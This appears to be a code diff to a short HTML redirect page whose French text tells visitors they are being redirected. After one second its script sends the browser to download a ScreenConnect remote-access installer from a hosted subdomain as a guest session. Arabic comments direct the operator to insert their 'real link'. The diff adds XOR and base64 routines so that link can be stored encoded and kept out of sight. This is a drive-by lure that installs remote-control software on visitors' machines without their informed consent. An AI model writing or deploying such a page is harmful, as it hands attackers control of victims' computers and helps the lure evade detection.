@@ -8,8 +8,52 @@
     <p>Vous allez être redirigé...</p>
 
     <script>
+        // ============================================
+        // 1) ضع رابطك الحقيقي هنا بين العلامتين ""
+        // ============================================
+        var realUrl = "https://mtidaabstract.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+
+        // ============================================
+        // 2) مفتاح التشفير (لا تغيره)
+        // ============================================
+        var secretKey = "MyKey2024";
+
+        // دالة التشفير
+        function encrypt(text, key) {
+            var result = "";
+            for (var i = 0; i < text.length; i++) {
+                result += String.fromCharCode(
+                    text.charCodeAt(i) ^ key.charCodeAt(i % key.length)
+                );
+            }
+            return btoa(result);
+        }
+
+        // دالة فك التشفير
+        function decrypt(encoded, key) {
+            var text = atob(encoded);
+            var result = "";
+            for (var i = 0; i < text.length; i++) {
+                result += String.fromCharCode(
+                    text.charCodeAt(i) ^ key.charCodeAt(i % key.length)
+                );
+            }
+            return result;
+        }
+
         setTimeout(function() {
-            window.location.href = 'https://mtidaabstract.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
+            try {
+                var target = realUrl;
+
+                // إذا كان الرابط لا يبدأ بـ http فهذا يعني أنه مشفر
+                if (target.indexOf("http") !== 0) {
+                    target = decrypt(realUrl, secretKey);
+                }
+
+                window.location.href = target;
+            } catch (e) {
+                console.error("خطأ:", e);
+            }
         }, 1000);
     </script>
 </body>
